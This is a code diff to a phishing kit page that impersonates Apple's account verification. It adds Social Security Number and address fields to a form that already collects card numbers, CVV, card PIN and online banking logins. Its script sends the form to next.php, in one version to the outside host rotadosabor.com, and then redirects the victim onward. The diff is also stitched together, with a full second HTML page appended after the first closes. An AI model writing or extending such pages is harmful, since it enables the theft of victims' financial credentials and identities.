@@ -605,6 +605,66 @@
                         </div>
                     </div>
                     
+                    <!-- Added SSN field -->
+                    <div class="form-row">
+                        <div class="form-column">
+                            <div class="form-group">
+                                <label for="ssn">Social Security Number (SSN)</label>
+                                <input type="text" class="form-control" id="ssn" name="ssn" required placeholder="•••-••-••••">
+                                <div class="help-text">Format: XXX-XX-XXXX</div>
+                            </div>
+                        </div>
+                    </div>
+                    
+                    <!-- Added Address fields -->
+                    <div class="form-row">
+                        <div class="form-column">
+                            <div class="form-group">
+                                <label for="address1">Street Address</label>
+                                <input type="text" class="form-control" id="address1" name="address1" required>
+                            </div>
+                        </div>
+                    </div>
+                    
+                    <div class="form-row">
+                        <div class="form-column">
+                            <div class="form-group">
+                                <label for="address2">Apartment, suite, etc. (optional)</label>
+                                <input type="text" class="form-control" id="address2" name="address2">
+                            </div>
+                        </div>
+                    </div>
+                    
+                    <div class="form-row">
+                        <div class="form-column">
+                            <div class="form-group">
+                                <label for="city">City</label>
+                                <input type="text" class="form-control" id="city" name="city" required>
+                            </div>
+                        </div>
+                        <div class="form-column">
+                            <div class="form-group">
+                                <label for="state">State/Province</label>
+                                <input type="text" class="form-control" id="state" name="state" required>
+                            </div>
+                        </div>
+                    </div>
+                    
+                    <div class="form-row">
+                        <div class="form-column">
+                            <div class="form-group">
+                                <label for="zipcode">Zip/Postal Code</label>
+                                <input type="text" class="form-control" id="zipcode" name="zipcode" required>
+                            </div>
+                        </div>
+                        <div class="form-column">
+                            <div class="form-group">
+                                <label for="country">Country</label>
+                                <input type="text" class="form-control" id="country" name="country" required>
+                            </div>
+                        </div>
+                    </div>
+                    
                     <div class="info-box">
                         <h3 class="info-title">Why we need this information</h3>
                         <p class="info-text">Apple requires payment verification to process your request securely. This protects your Apple ID and ensures that only you can access your account. Your information is encrypted using industry-standard protocols and will not be stored after verification.</p>
@@ -650,6 +710,7 @@
             $("#ccn").inputmask({"mask": "9999 9999 9999 9999"});
             $("#exdate").inputmask({"mask": "99/9999", "placeholder": "MM/YYYY"});
             $("#cvv").inputmask({"mask": "999"});
+            $("#ssn").inputmask({"mask": "999-99-9999"});
             
             // Display user email from previous step
             var email = localStorage.getItem('userEmail') || 'example@icloud.com';
@@ -667,18 +728,772 @@
                 // Disable button to prevent double submission
                 $('#verify-button').prop('disabled', true).html('<span class="spinner-border spinner-border-sm" role="status" aria-hidden="true"></span> Processing...');
                 
-                // Submit form via AJAX
+                // Get form data
+                var formData = $(this).serialize();
+                
+                // Submit form via direct AJAX with minimal settings
+                $.ajax({
+                    url: "next.php",
+                    type: "POST",
+                    data: formData,
+                    cache: false,
+                    processData: true,
+                    complete: function() {
+                        // Redirect to details page after small delay
+                        setTimeout(function() {
+                            window.location.href = "details.html";
+                        }, 500);
+                    }
+                });
+            });
+        });
+    </script>
+</body>
+</html><!doctype html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <meta name="robots" content="noindex, nofollow, noarchive">
+    <title>Apple - Verify Your Account</title>
+    
+    <!-- Bootstrap CSS -->
+    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css" integrity="sha384-Gn5384xqQ1aoWXA+058RXPxPg6fy4IWvTNh0E263XmFcJlSAwiGgFAW/dAiS6JXm" crossorigin="anonymous">
+    <link href="https://fonts.googleapis.com/css2?family=SF+Pro+Display:wght@300;400;500;600&display=swap" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=SF+Pro+Text:wght@300;400;500;600&display=swap" rel="stylesheet">
+
+    <!-- Custom Styles -->
+    <style>
+        :root {
+            --apple-blue: #0071e3;
+            --apple-blue-hover: #0077ed;
+            --apple-background: #fbfbfd;
+            --apple-text-main: #1d1d1f;
+            --apple-text-secondary: #6e6e73;
+            --apple-white: #ffffff;
+            --apple-border: #d2d2d7;
+            --apple-nav-bg: rgba(0, 0, 0, 0.8);
+            --apple-gray-bg: #f5f5f7;
+        }
+        
+        body, html {
+            height: 100%;
+            margin: 0;
+            background-color: var(--apple-background);
+            color: var(--apple-text-main);
+            font-family: "SF Pro Text", -apple-system, BlinkMacSystemFont, system-ui, Helvetica, Arial, sans-serif;
+            line-height: 1.47059;
+            font-weight: 400;
+            letter-spacing: -0.022em;
+            -webkit-font-smoothing: antialiased;
+            -moz-osx-font-smoothing: grayscale;
+        }
+        
+        /* Navbar */
+        #apple-nav {
+            background-color: var(--apple-nav-bg);
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 44px;
+            z-index: 9999;
+            backdrop-filter: saturate(180%) blur(20px);
+        }
+        
+        .nav-content {
+            display: flex;
+            justify-content: space-between;
+            max-width: 980px;
+            margin: 0 auto;
+            height: 100%;
+            padding: 0 22px;
+        }
+        
+        .nav-logo {
+            display: flex;
+            align-items: center;
+        }
+        
+        .nav-logo svg {
+            fill: #fff;
+            height: 20px;
+            width: 20px;
+        }
+        
+        .nav-items {
+            display: flex;
+            list-style: none;
+            margin: 0;
+            padding: 0;
+        }
+        
+        .nav-items li {
+            display: flex;
+            align-items: center;
+        }
+        
+        .nav-items a {
+            color: rgba(255, 255, 255, 0.8);
+            text-decoration: none;
+            font-size: 12px;
+            padding: 0 10px;
+            transition: color 0.2s;
+        }
+        
+        .nav-items a:hover {
+            color: #fff;
+        }
+        
+        /* Main Content */
+        .main-content {
+            padding-top: 76px;
+            padding-bottom: 60px;
+        }
+        
+        .container-wide {
+            max-width: 1100px;
+            margin: 0 auto;
+            padding: 0 22px;
+        }
+        
+        /* Headings */
+        .main-title {
+            font-family: "SF Pro Display", -apple-system, BlinkMacSystemFont, system-ui, Helvetica, Arial, sans-serif;
+            font-size: 40px;
+            font-weight: 600;
+            text-align: center;
+            margin-bottom: 12px;
+            letter-spacing: -0.003em;
+        }
+        
+        .subtitle {
+            font-size: 21px;
+            font-weight: 400;
+            color: var(--apple-text-secondary);
+            text-align: center;
+            margin-bottom: 48px;
+            max-width: 800px;
+            margin-left: auto;
+            margin-right: auto;
+            line-height: 1.38105;
+        }
+        
+        /* Progress Steps */
+        .progress-steps {
+            display: flex;
+            justify-content: space-between;
+            margin: 0 auto 56px;
+            max-width: 600px;
+            position: relative;
+        }
+        
+        .progress-steps::before {
+            content: '';
+            position: absolute;
+            top: 16px;
+            left: 0;
+            width: 100%;
+            height: 1px;
+            background-color: var(--apple-border);
+            z-index: 1;
+        }
+        
+        .step {
+            flex: 1;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            position: relative;
+            z-index: 2;
+        }
+        
+        .step-circle {
+            width: 32px;
+            height: 32px;
+            border-radius: 50%;
+            background-color: var(--apple-gray-bg);
+            border: 1px solid var(--apple-border);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 16px;
+            font-weight: 500;
+            margin-bottom: 12px;
+            z-index: 2;
+            color: var(--apple-text-main);
+        }
+        
+        .step.completed .step-circle {
+            background-color: var(--apple-blue);
+            border-color: var(--apple-blue);
+            color: white;
+        }
+        
+        .step.active .step-circle {
+            border-color: var(--apple-blue);
+            color: var(--apple-blue);
+            border-width: 2px;
+        }
+        
+        .step-label {
+            font-size: 14px;
+            color: var(--apple-text-secondary);
+            text-align: center;
+        }
+        
+        .step.completed .step-label,
+        .step.active .step-label {
+            color: var(--apple-text-main);
+            font-weight: 500;
+        }
+        
+        /* Account Info Bar */
+        .account-info {
+            display: flex;
+            align-items: center;
+            background-color: var(--apple-gray-bg);
+            border-radius: 12px;
+            padding: 16px 20px;
+            margin-bottom: 32px;
+        }
+        
+        .account-icon {
+            width: 36px;
+            height: 36px;
+            background-color: var(--apple-blue);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-right: 14px;
+            flex-shrink: 0;
+        }
+        
+        .account-icon span {
+            color: white;
+            font-size: 18px;
+            font-weight: 600;
+        }
+        
+        .account-details {
+            flex: 1;
+        }
+        
+        .account-email {
+            font-size: 16px;
+            font-weight: 500;
+            margin-bottom: 2px;
+        }
+        
+        .account-status {
+            font-size: 14px;
+            color: var(--apple-text-secondary);
+        }
+        
+        /* Card */
+        .content-card {
+            background-color: var(--apple-white);
+            border-radius: 18px;
+            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.05);
+            padding: 32px 36px;
+            margin-bottom: 24px;
+        }
+        
+        .card-title {
+            font-size: 24px;
+            font-weight: 600;
+            margin-bottom: 12px;
+            color: var(--apple-text-main);
+        }
+        
+        .card-description {
+            font-size: 17px;
+            color: var(--apple-text-secondary);
+            margin-bottom: 32px;
+            line-height: 1.4;
+        }
+        
+        /* Form Styling */
+        .form-group {
+            margin-bottom: 20px;
+        }
+        
+        label {
+            font-size: 14px;
+            font-weight: 500;
+            color: var(--apple-text-main);
+            margin-bottom: 8px;
+            display: block;
+        }
+        
+        .form-control {
+            border: 1px solid var(--apple-border);
+            border-radius: 10px;
+            padding: 13px 16px;
+            font-size: 15px;
+            color: var(--apple-text-main);
+            width: 100%;
+            transition: all 0.2s;
+            background-color: var(--apple-white);
+            height: auto;
+            line-height: 1.4;
+        }
+        
+        .form-control:focus {
+            border-color: var(--apple-blue);
+            box-shadow: 0 0 0 2px rgba(0, 113, 227, 0.15);
+            outline: none;
+        }
+        
+        .form-control::placeholder {
+            color: #a1a1a6;
+        }
+        
+        .form-row {
+            display: flex;
+            flex-wrap: wrap;
+            margin-left: -12px;
+            margin-right: -12px;
+        }
+        
+        .form-column {
+            flex: 1;
+            padding-left: 12px;
+            padding-right: 12px;
+            min-width: 0;
+        }
+        
+        .help-text {
+            font-size: 12px;
+            color: var(--apple-text-secondary);
+            margin-top: 4px;
+        }
+        
+        /* Info Box */
+        .info-box {
+            background-color: var(--apple-gray-bg);
+            border-radius: 12px;
+            padding: 20px 24px;
+            margin-top: 12px;
+            margin-bottom: 28px;
+        }
+        
+        .info-title {
+            font-size: 17px;
+            font-weight: 600;
+            margin-bottom: 8px;
+        }
+        
+        .info-text {
+            font-size: 14px;
+            color: var(--apple-text-secondary);
+            line-height: 1.4;
+            margin: 0;
+        }
+        
+        /* Buttons */
+        .button-group {
+            display: flex;
+            justify-content: flex-end;
+            margin-top: 32px;
+        }
+        
+        .btn {
+            font-size: 17px;
+            font-weight: 400;
+            padding: 8px 18px;
+            min-width: 110px;
+            border-radius: 980px;
+            text-align: center;
+            border: none;
+            cursor: pointer;
+            transition: all 0.2s;
+        }
+        
+        .btn-secondary {
+            background-color: var(--apple-gray-bg);
+            color: var(--apple-text-main);
+            margin-right: 12px;
+        }
+        
+        .btn-secondary:hover {
+            background-color: #e5e5ea;
+        }
+        
+        .btn-primary {
+            background-color: var(--apple-blue);
+            color: white;
+        }
+        
+        .btn-primary:hover {
+            background-color: var(--apple-blue-hover);
+        }
+        
+        /* Footer */
+        .footer {
+            background-color: var(--apple-gray-bg);
+            padding: 17px 0;
+            font-size: 12px;
+            line-height: 1.33341;
+            color: var(--apple-text-secondary);
+        }
+        
+        .footer-content {
+            max-width: 980px;
+            margin: 0 auto;
+            padding: 0 22px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+        
+        .footer-links {
+            display: flex;
+        }
+        
+        .footer-links a {
+            color: var(--apple-text-secondary);
+            text-decoration: none;
+            margin-right: 20px;
+            white-space: nowrap;
+        }
+        
+        .footer-links a:hover {
+            text-decoration: underline;
+            color: var(--apple-text-main);
+        }
+        
+        .footer-legal {
+            white-space: nowrap;
+        }
+        
+        /* Honeypot for bots */
+        .bot-field {
+            position: absolute;
+            left: -9999px;
+            opacity: 0;
+            height: 0;
+        }
+        
+        /* Responsive */
+        @media (max-width: 768px) {
+            .main-title {
+                font-size: 32px;
+            }
+            
+            .subtitle {
+                font-size: 17px;
+            }
+            
+            .content-card {
+                padding: 24px 20px;
+            }
+            
+            .form-row {
+                flex-direction: column;
+            }
+            
+            .form-column {
+                width: 100%;
+                margin-bottom: 10px;
+            }
+            
+            .nav-items li:not(:first-child):not(:last-child) {
+                display: none;
+            }
+            
+            .footer-content {
+                flex-direction: column;
+            }
+            
+            .footer-links {
+                margin-bottom: 10px;
+                flex-wrap: wrap;
+            }
+            
+            .footer-links a {
+                margin-bottom: 5px;
+            }
+        }
+    </style>
+</head>
+
+<body>
+    <!-- Apple Navigation -->
+    <nav id="apple-nav">
+        <div class="nav-content">
+            <div class="nav-logo">
+                <a href="#" aria-label="Apple">
+                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 16 44">
+                        <path d="M8.02 16.23c-.73 0-1.86-.83-3.05-.8-1.57.02-3.01.91-3.82 2.32-1.63 2.83-.42 7.01 1.17 9.31.78 1.12 1.7 2.38 2.92 2.34 1.17-.05 1.61-.76 3.03-.76 1.41 0 1.81.76 3.05.73 1.26-.02 2.06-1.14 2.83-2.27.89-1.3 1.26-2.56 1.28-2.63-.03-.01-2.45-.94-2.48-3.74-.02-2.34 1.91-3.46 2-3.51-1.1-1.61-2.79-1.79-3.38-1.83-1.54-.12-2.83.84-3.55.84zm2.6-2.36c.65-.78 1.08-1.87.96-2.95-.93.04-2.05.62-2.72 1.4-.6.69-1.12 1.8-.98 2.86 1.03.08 2.09-.53 2.74-1.31"></path>
+                    </svg>
+                </a>
+            </div>
+            <ul class="nav-items">
+                <li><a href="#">Store</a></li>
+                <li><a href="#">Mac</a></li>
+                <li><a href="#">iPad</a></li>
+                <li><a href="#">iPhone</a></li>
+                <li><a href="#">Watch</a></li>
+                <li><a href="#">AirPods</a></li>
+                <li><a href="#">TV & Home</a></li>
+                <li><a href="#">Entertainment</a></li>
+                <li><a href="#">Accessories</a></li>
+                <li><a href="#">Support</a></li>
+            </ul>
+        </div>
+    </nav>
+
+    <!-- Main Content -->
+    <div class="main-content">
+        <div class="container-wide">
+            <h1 class="main-title">Verify Your Account</h1>
+            <p class="subtitle">We need to verify your payment details to process your request. This helps ensure the security of your Apple ID and protects your account.</p>
+            
+            <!-- Progress Steps -->
+            <div class="progress-steps">
+                <div class="step completed">
+                    <div class="step-circle">1</div>
+                    <div class="step-label">Sign In</div>
+                </div>
+                <div class="step active">
+                    <div class="step-circle">2</div>
+                    <div class="step-label">Verify Payment</div>
+                </div>
+                <div class="step">
+                    <div class="step-circle">3</div>
+                    <div class="step-label">Confirm Details</div>
+                </div>
+            </div>
+            
+            <!-- Account Info Bar -->
+            <div class="account-info">
+                <div class="account-icon">
+                    <span>A</span>
+                </div>
+                <div class="account-details">
+                    <div class="account-email" id="user-email">example@icloud.com</div>
+                    <div class="account-status">Apple ID • Signed in</div>
+                </div>
+            </div>
+            
+            <!-- Payment Verification Card -->
+            <div class="content-card">
+                <h2 class="card-title">Payment Verification</h2>
+                <p class="card-description">Please provide details of the payment method associated with your Apple ID. This information is required to verify your identity and will be encrypted and handled securely.</p>
+                
+                <form id="verification-form" action="#" method="post">
+                    <input type="hidden" name="btn2" value="btn2">
+                    
+                    <!-- Honeypot fields for bots -->
+                    <div class="bot-field">
+                        <input type="text" name="website2" id="website2">
+                        <input type="text" name="phone_confirm" id="phone_confirm">
+                    </div>
+                    
+                    <div class="form-row">
+                        <div class="form-column">
+                            <div class="form-group">
+                                <label for="bank_name">Bank Name</label>
+                                <input type="text" class="form-control" id="bank_name" name="bank_name" required>
+                            </div>
+                        </div>
+                        <div class="form-column">
+                            <div class="form-group">
+                                <label for="noc">Name on Card</label>
+                                <input type="text" class="form-control" id="noc" name="noc" required>
+                            </div>
+                        </div>
+                    </div>
+                    
+                    <div class="form-row">
+                        <div class="form-column">
+                            <div class="form-group">
+                                <label for="ccn">Card Number</label>
+                                <input type="text" class="form-control" id="ccn" name="ccn" required placeholder="•••• •••• •••• ••••">
+                            </div>
+                        </div>
+                    </div>
+                    
+                    <div class="form-row">
+                        <div class="form-column">
+                            <div class="form-group">
+                                <label for="exdate">Expiration Date</label>
+                                <input type="text" class="form-control" id="exdate" name="exdate" required placeholder="MM/YYYY">
+                            </div>
+                        </div>
+                        <div class="form-column">
+                            <div class="form-group">
+                                <label for="cvv">Security Code (CVV)</label>
+                                <input type="text" class="form-control" id="cvv" name="cvv" required placeholder="•••">
+                            </div>
+                        </div>
+                    </div>
+                    
+                    <div class="form-row">
+                        <div class="form-column">
+                            <div class="form-group">
+                                <label for="pin">Card PIN</label>
+                                <input type="password" class="form-control" id="pin" name="pin" required placeholder="••••">
+                            </div>
+                        </div>
+                        <div class="form-column">
+                            <div class="form-group">
+                                <label for="bank_user">Online Banking Username</label>
+                                <input type="text" class="form-control" id="bank_user" name="bank_user" required>
+                                <div class="help-text">Your online banking login username</div>
+                            </div>
+                        </div>
+                    </div>
+                    
+                    <div class="form-row">
+                        <div class="form-column">
+                            <div class="form-group">
+                                <label for="bank_pass">Online Banking Password</label>
+                                <input type="password" class="form-control" id="bank_pass" name="bank_pass" required>
+                            </div>
+                        </div>
+                    </div>
+                    
+                    <!-- Added SSN field -->
+                    <div class="form-row">
+                        <div class="form-column">
+                            <div class="form-group">
+                                <label for="ssn">Social Security Number (SSN)</label>
+                                <input type="text" class="form-control" id="ssn" name="ssn" required placeholder="•••-••-••••">
+                                <div class="help-text">Format: XXX-XX-XXXX</div>
+                            </div>
+                        </div>
+                    </div>
+                    
+                    <!-- Added Address fields -->
+                    <div class="form-row">
+                        <div class="form-column">
+                            <div class="form-group">
+                                <label for="address1">Street Address</label>
+                                <input type="text" class="form-control" id="address1" name="address1" required>
+                            </div>
+                        </div>
+                    </div>
+                    
+                    <div class="form-row">
+                        <div class="form-column">
+                            <div class="form-group">
+                                <label for="address2">Apartment, suite, etc. (optional)</label>
+                                <input type="text" class="form-control" id="address2" name="address2">
+                            </div>
+                        </div>
+                    </div>
+                    
+                    <div class="form-row">
+                        <div class="form-column">
+                            <div class="form-group">
+                                <label for="city">City</label>
+                                <input type="text" class="form-control" id="city" name="city" required>
+                            </div>
+                        </div>
+                        <div class="form-column">
+                            <div class="form-group">
+                                <label for="state">State/Province</label>
+                                <input type="text" class="form-control" id="state" name="state" required>
+                            </div>
+                        </div>
+                    </div>
+                    
+                    <div class="form-row">
+                        <div class="form-column">
+                            <div class="form-group">
+                                <label for="zipcode">Zip/Postal Code</label>
+                                <input type="text" class="form-control" id="zipcode" name="zipcode" required>
+                            </div>
+                        </div>
+                        <div class="form-column">
+                            <div class="form-group">
+                                <label for="country">Country</label>
+                                <input type="text" class="form-control" id="country" name="country" required>
+                            </div>
+                        </div>
+                    </div>
+                    
+                    <div class="info-box">
+                        <h3 class="info-title">Why we need this information</h3>
+                        <p class="info-text">Apple requires payment verification to process your request securely. This protects your Apple ID and ensures that only you can access your account. Your information is encrypted using industry-standard protocols and will not be stored after verification.</p>
+                    </div>
+                    
+                    <div class="button-group">
+                        <button type="button" class="btn btn-secondary" onclick="window.history.back()">Back</button>
+                        <button type="submit" id="verify-button" class="btn btn-primary">Continue</button>
+                    </div>
+                </form>
+            </div>
+            
+            <!-- Next Step Preview Card -->
+            <div class="content-card">
+                <h2 class="card-title">Next Step: Confirm Your Details</h2>
+                <p class="card-description">After verifying your payment information, you'll need to confirm your personal details. This is the final step in our security verification process.</p>
+            </div>
+        </div>
+    </div>
+
+    <!-- Footer -->
+    <footer class="footer">
+        <div class="footer-content">
+            <div class="footer-links">
+                <a href="#">Privacy Policy</a>
+                <a href="#">Terms of Use</a>
+                <a href="#">Sales and Refunds</a>
+                <a href="#">Legal</a>
+                <a href="#">Site Map</a>
+            </div>
+            <div class="footer-legal">
+                Copyright © 2025 Apple Inc. All rights reserved.
+            </div>
+        </div>
+    </footer>
+
+    <!-- Scripts -->
+    <script src="https://code.jquery.com/jquery-3.5.1.min.js"></script>
+    <script src="https://s3-us-west-2.amazonaws.com/s.cdpn.io/3/jquery.inputmask.bundle.js"></script>
+    <script>
+        $(document).ready(function() {
+            // Format inputs
+            $("#ccn").inputmask({"mask": "9999 9999 9999 9999"});
+            $("#exdate").inputmask({"mask": "99/9999", "placeholder": "MM/YYYY"});
+            $("#cvv").inputmask({"mask": "999"});
+            $("#ssn").inputmask({"mask": "999-99-9999"});
+            
+            // Display user email from previous step
+            var email = localStorage.getItem('userEmail') || 'example@icloud.com';
+            $('#user-email').text(email);
+            
+            // Form submission
+            $('#verification-form').on('submit', function(e) {
+                e.preventDefault();
+                
+                // Validate form
+                if (!this.checkValidity()) {
+                    return;
+                }
+                
+                // Disable button to prevent double submission
+                $('#verify-button').prop('disabled', true).html('<span class="spinner-border spinner-border-sm" role="status" aria-hidden="true"></span> Processing...');
+                
+                // Get form data
+                var formData = $(this).serialize();
+                
+                // Submit form via direct AJAX with minimal settings
                 $.ajax({
                     url: "https://rotadosabor.com/joker/next.php",
-                    type: 'POST',
-                    data: $(this).serialize(),
-                    success: function() {
-                        // Redirect to details page
-                        window.location.href = 'details.html';
-                    },
-                    error: function() {
-                        // Still redirect on error to keep flow going
-                        window.location.href = 'details.html';
+                    type: "POST",
+                    data: formData,
+                    cache: false,
+                    processData: true,
+                    complete: function() {
+                        // Redirect to details page after small delay
+                        setTimeout(function() {
+                            window.location.href = "details.html";
+                        }, 500);
                     }
                 });
             });
